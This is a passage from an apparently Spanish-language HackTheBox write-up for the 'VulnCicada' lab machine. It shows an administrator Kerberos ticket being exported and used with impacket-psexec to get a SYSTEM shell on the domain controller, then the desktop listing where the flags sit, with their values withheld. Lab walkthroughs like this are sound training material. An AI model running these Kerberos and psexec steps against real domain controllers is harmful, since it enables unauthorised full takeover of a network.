Impacket v0.14.0.dev0+20251117.163331.7bd0d5ab - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache

┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ export KRB5CCNAME=$(pwd)/administrator.ccache
~~~
Y se ingresa a la maquina por psexec.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ impacket-psexec cicada.vl/administrator@DC-JPQ225.cicada.vl -k -no-pass -target-ip 10.129.64.82
Impacket v0.14.0.dev0+20251117.163331.7bd0d5ab - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.64.82.....
[*] Found writable share ADMIN$
[*] Uploading file sXRmWCeH.exe
[*] Opening SVCManager on 10.129.64.82.....
[*] Creating service dtUT on 10.129.64.82.....
[*] Starting service dtUT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
~~~

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Asi que ahora solo es cosa de buscar las flags.
~~~bash
C:\Users> cd administrator
 dektop
ls
PS C:\Users\administrator> cd desktop
PS C:\Users\administrator\desktop> ls


    Directory: C:\Users\administrator\desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/15/2024   6:26 AM           2304 Microsoft Edge.lnk                                                   
-ar---         1/16/2026  10:16 AM             34 root.txt                                                             
-ar---         1/16/2026  10:16 AM             34 user.txt                                                             


type user.txt
PS C:\Users\administrator\desktop> type user.txt
<Encuentre su propia user flag>
type root.txt
PS C:\Users\administrator\desktop> type root.txt
<Encuentre su propia root flag>
~~~

🎉 Sistema completamente comprometido - Root obtenido

